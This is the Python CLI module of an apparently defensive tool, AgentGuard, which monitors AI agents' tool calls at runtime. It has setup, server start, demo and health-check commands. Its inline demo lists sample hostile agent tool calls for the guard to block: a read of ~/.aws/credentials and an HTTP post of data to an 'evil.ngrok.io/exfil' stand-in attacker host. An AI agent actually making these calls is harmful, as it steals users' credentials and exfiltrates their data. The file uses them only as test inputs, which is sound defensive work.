"""AgentGuard CLI — agentguard <command>"""

from __future__ import annotations

import argparse
import os
import sys
import textwrap
from pathlib import Path


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_PACKAGE_ROOT = Path(__file__).parent          # agentguard/
_EXAMPLES_DIR = _PACKAGE_ROOT.parent / "examples"  # bundled examples/ next to agentguard/


def _print_banner() -> None:
    print(textwrap.dedent("""
    ╔══════════════════════════════════════════╗
    ║        AgentGuard — AI Runtime Guard     ║
    ║  Runtime detection & response for agents ║
    ╚══════════════════════════════════════════╝
    """))


# ---------------------------------------------------------------------------
# agentguard init
# ---------------------------------------------------------------------------

def cmd_init(_args: argparse.Namespace) -> None:
    """Interactive setup wizard — creates .env in the current directory."""
    _print_banner()
    print("Setting up AgentGuard...\n")

    env_path = Path.cwd() / ".env"
    if env_path.exists():
        overwrite = input(f".env already exists at {env_path}. Overwrite? [y/N] ").strip().lower()
        if overwrite != "y":
            print("Keeping existing .env. Run 'agentguard start' when ready.")
            return

    # Copy the bundled .env.example as a starting point
    template = _PACKAGE_ROOT / "templates" / "env.example"
    if template.exists():
        import shutil
        shutil.copy(template, env_path)
        print(f"✓ Created {env_path} from template")
    else:
        env_path.write_text("# AgentGuard configuration\nANTHROPIC_API_KEY=\nDATABASE_URL=sqlite+aiosqlite:///./agentguard.db\n")
        print(f"✓ Created {env_path}")

    print("\nNow open .env and fill in your API key. Then:")
    print("  agentguard start    — start the API server")
    print("  agentguard demo     — run attack scenario demo")
    print("  agentguard status   — verify everything is running\n")
    print("For the dashboard UI, clone the repo and run 'cd dashboard && npm install && npm run dev'.")


# ---------------------------------------------------------------------------
# agentguard start
# ---------------------------------------------------------------------------

def cmd_start(args: argparse.Namespace) -> None:
    """Start the AgentGuard API server."""
    try:
        import uvicorn
    except ImportError:
        print("Error: uvicorn is not installed. Run: pip install agentguard", file=sys.stderr)
        sys.exit(1)

    # Load .env if present
    env_path = Path.cwd() / ".env"
    if env_path.exists():
        try:
            from dotenv import load_dotenv
            load_dotenv(env_path)
        except ImportError:
            pass

    host = getattr(args, "host", None) or os.getenv("API_HOST", "0.0.0.0")
    port = int(getattr(args, "port", None) or os.getenv("API_PORT", "8000"))
    reload = getattr(args, "reload", False)

    print(f"Starting AgentGuard API on http://{host}:{port}")
    print("  Docs: http://localhost:8000/docs")
    print("  Dashboard: run 'cd dashboard && npm run dev' for the UI\n")

    uvicorn.run(
        "api.main:app",
        host=host,
        port=port,
        reload=reload,
    )


# ---------------------------------------------------------------------------
# agentguard demo
# ---------------------------------------------------------------------------

def cmd_demo(_args: argparse.Namespace) -> None:
    """Run AgentGuard against 6 live attack scenarios (requires ANTHROPIC_API_KEY)."""
    # Load .env if present
    env_path = Path.cwd() / ".env"
    if env_path.exists():
        try:
            from dotenv import load_dotenv
            load_dotenv(env_path)
        except ImportError:
            pass

    # Use bundled examples/ (works both from source and pip install)
    demo_script = _EXAMPLES_DIR / "demo_attack.py"
    if demo_script.exists():
        import runpy
        runpy.run_path(str(demo_script), run_name="__main__")
        return

    # Final fallback — inline minimal demo
    print("Running AgentGuard inline demo...\n")
    _run_inline_demo()


def _run_inline_demo() -> None:
    import asyncio

    async def run() -> None:
        from agentguard.core.secure_agent import SecureAgent
        from agentguard.core.models import Decision

        scenarios = [
            {
                "tool": "file.read",
                "args": {"path": "~/.aws/credentials"},
                "goal": "Summarize the README file",
                "label": "Credential theft",
            },
            {
                "tool": "http.post",
                "args": {"url": "https://evil.ngrok.io/exfil", "data": "secret"},
                "goal": "Summarize the README file",
                "label": "Data exfiltration",
            },
            {
                "tool": "file.read",
                "args": {"path": "README.md"},
                "goal": "Summarize the README file",
                "label": "Legitimate file read",
            },
        ]

        guard = SecureAgent.from_env(goal="Summarize the README file")
        print("Scenario results:")
        print("-" * 60)
        for s in scenarios:
            decision, event = await guard.intercept({
                "tool_name": s["tool"],
                "parameters": s["args"],
            })
            status = "BLOCKED" if decision == Decision.BLOCK else "ALLOWED"
            score = event.assessment.risk_score if event.assessment else 0.0
            print(f"  {s['label']:<30} {status}  (risk={score:.2f})")

    asyncio.run(run())


# ---------------------------------------------------------------------------
# agentguard status
# ---------------------------------------------------------------------------

def cmd_status(_args: argparse.Namespace) -> None:
    """Check if the AgentGuard API is running and healthy."""
    import urllib.request
    import urllib.error
    import json

    base_url = os.getenv("AGENTGUARD_API_URL", "http://localhost:8000")

    def check(path: str, label: str) -> None:
        url = f"{base_url}{path}"
        try:
            with urllib.request.urlopen(url, timeout=3) as resp:
                data = json.loads(resp.read())
                status = data.get("status", "unknown")
                color = "\033[32m" if status == "healthy" else "\033[33m"
                reset = "\033[0m"
                print(f"  {label:<20} {color}{status}{reset}")
                if path == "/api/v1/readiness" and "components" in data:
                    for name, info in data["components"].items():
                        comp_status = info.get("status", "unknown")
                        latency = info.get("latency_ms", "")
                        latency_str = f" ({latency:.1f}ms)" if latency else ""
                        comp_color = "\033[32m" if comp_status == "healthy" else "\033[33m"
                        print(f"    ↳ {name:<16} {comp_color}{comp_status}{reset}{latency_str}")
        except urllib.error.URLError:
            print(f"  {label:<20} \033[31moffline\033[0m  (is 'agentguard start' running?)")

    print(f"AgentGuard status ({base_url})")
    print("-" * 40)
    check("/api/v1/health", "API")
    check("/api/v1/readiness", "Readiness")
    print()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        prog="agentguard",
        description="AgentGuard — runtime detection and response for AI agents",
    )
    sub = parser.add_subparsers(dest="command", metavar="<command>")

    # init
    sub.add_parser("init", help="Interactive setup wizard — creates .env configuration")

    # start
    start_p = sub.add_parser("start", help="Start the AgentGuard API server")
    start_p.add_argument("--host", default=None, help="Bind host (default: 0.0.0.0)")
    start_p.add_argument("--port", type=int, default=None, help="Bind port (default: 8000)")
    start_p.add_argument("--reload", action="store_true", help="Enable auto-reload (dev mode)")

    # demo
    sub.add_parser("demo", help="Run attack scenario demo (requires LLM API key)")

    # status
    sub.add_parser("status", help="Check if the AgentGuard API is running")

    args = parser.parse_args()

    commands = {
        "init": cmd_init,
        "start": cmd_start,
        "demo": cmd_demo,
        "status": cmd_status,
    }

    if args.command in commands:
        commands[args.command](args)
    else:
        parser.print_help()
        sys.exit(0)


if __name__ == "__main__":
    main()
